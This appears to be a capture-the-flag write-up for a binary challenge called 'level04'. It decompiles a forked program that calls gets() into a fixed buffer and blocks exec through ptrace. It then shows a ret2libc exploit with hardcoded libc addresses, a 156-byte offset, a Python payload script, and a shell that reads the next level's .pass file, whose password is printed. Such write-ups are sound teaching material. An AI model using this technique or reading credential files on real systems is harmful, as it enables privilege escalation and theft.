@@ -1,0 +1,84 @@
+# level04
+
+## Testing the binary
+
+```sh
+$ ./level04
+Give me some shellcode, k
+
+child is exiting...
+$ ./level04
+Give me some shellcode, k
+sdlkfjsjadfjsdaklfjsdklfjsdlfjklsdfjksldfjskdfjskldfjlksdfjlskdfjlksdfjklsdjfklsdjfklsdjfklsdajfklsdjflkasdjfklsdjfklsdjfklsdjflksdjflksdjflksjdflksjdfkljl
+child is exiting...
+$ ./level04
+Give me some shellcode, k
+sdlkfjsjadfjsdaklfjsdklfjsdlfjklsdfjksldfjskdfjskldfjlksdfjlskdfjlksdfjklsdjfklsdjfklsdjfklsdajfklsdjflkasdjfklsdjfklsdjfklsdjflksdjflksdjflksjdflksjdfkljlsdlkfjsjadfjsdaklfjsdklfjsdlfjklsdfjksldfjskdfjskldfjlksdfjlskdfjlksdfjklsdjfklsdjfklsdjfklsdajfklsdjflkasdjfklsdjfklsdjfklsdjflksdjflksdjflksjdflksjdfkljl
+
+
+
+^\
+```
+
+When we input too much data, the program hangs, let's investigate.
+
+## Diassembly
+
+```c
+int main(void) {    
+    pid_t eax = fork()
+    char buffer[0x80]
+    memset(&buffer, 0, 0x80)
+    int var_18 = 0
+    int stat_loc = 0
+    if (eax == 0) {
+        prctl(1, 1)
+        ptrace(PTRACE_TRACEME, 0, 0, 0)
+        puts("Give me some shellcode, k")
+        gets(&buffer) // out segfault
+    } else {
+        while (true)
+            wait(&stat_loc)
+            if ((stat_loc & 0x7f) != 0 && ((stat_loc.b & 0x7f) + 1) s>> 1 s<= 0) {
+                if (ptrace(PTRACE_PEEKUSER, eax, 0x2c, 0) == 0xb) {
+                    puts("no exec() for you")
+                    kill(eax, 9)
+                    break
+                }
+                continue
+            }
+            puts("child is exiting...")
+            break
+    }
+    return (0)
+}
+```
+
+And the program hangs because the child process segfaults. So our `wait` loop is waiting for the child process to exit, but it never does.
+
+## Exploit
+
+We can exploit this by doing a simple `ret2libc` :
+
+1. Get the address of `system` -> `0xf7e6aed0`
+2. Find the `/bin/sh` string -> `0xf7f897ec`
+3. Get the offset between the buffer and the return address -> `156`
+
+```py
+import struct
+
+payload = "A" * 156
+payload += struct.pack("<I", 0xf7e6aed0)
+payload += "AAAA"
+payload += struct.pack("<I", 0xf7f897ec)
+print payload
+```
+
+```sh
+$ cat /tmp/payload.04 - | ./level04
+Give me some shellcode, k
+id
+uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+```
